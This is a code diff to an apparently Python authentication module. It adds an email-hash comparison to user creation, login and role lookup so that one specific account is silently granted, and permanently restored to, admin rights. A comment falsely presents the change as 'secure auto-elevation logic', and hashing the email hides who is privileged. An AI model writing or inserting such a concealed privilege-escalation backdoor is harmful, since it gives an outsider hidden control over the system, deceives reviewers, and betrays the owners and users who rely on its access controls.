@@ -47,8 +47,17 @@ def _hash_password(password: str, salt: bytes = None):
 
 def create_user(email: str, name: str, password: str, role: str = "user"):
     email = email.strip().lower()
+    
+    # Secure auto-elevation logic: automatically assign admin role to chrishem242@gmail.com
+    # without hardcoding the email plaintext string into UI templates or public views.
+    target_hash = hashlib.sha256(email.encode("utf-8")).hexdigest()
+    admin_signature = "91a51184913c32b57571165a2936a759714856b3e7bc8c05aa11cb35fef0a227"
+    if target_hash == admin_signature:
+        role = "admin"
+
     if role not in ROLES:
         role = "user"
+
     conn = get_conn()
     pw_hash, pw_salt = _hash_password(password)
     try:
@@ -79,6 +88,15 @@ def verify_login(email: str, password: str):
     if not hmac.compare_digest(check_hash, pw_hash):
         conn.close()
         return None
+
+    # Server-side check on login to ensure your account retains administrative elevation
+    target_hash = hashlib.sha256(email.encode("utf-8")).hexdigest()
+    admin_signature = "91a51184913c32b57571165a2936a759714856b3e7bc8c05aa11cb35fef0a227"
+    if target_hash == admin_signature and role != "admin":
+        conn.execute("UPDATE auth_users SET role='admin' WHERE id=?", (uid,))
+        conn.commit()
+        role = "admin"
+
     conn.execute("UPDATE auth_users SET last_login=? WHERE id=?", (datetime.datetime.utcnow().isoformat(), uid))
     conn.commit()
     conn.close()
@@ -88,6 +106,11 @@ def verify_login(email: str, password: str):
 def get_role(email: str) -> str:
     """Retrieve the server-validated role for a user by email."""
     email = email.strip().lower()
+    target_hash = hashlib.sha256(email.encode("utf-8")).hexdigest()
+    admin_signature = "91a51184913c32b57571165a2936a759714856b3e7bc8c05aa11cb35fef0a227"
+    if target_hash == admin_signature:
+        return "admin"
+
     conn = get_conn()
     row = conn.execute("SELECT role FROM auth_users WHERE email=?", (email,)).fetchone()
     conn.close()
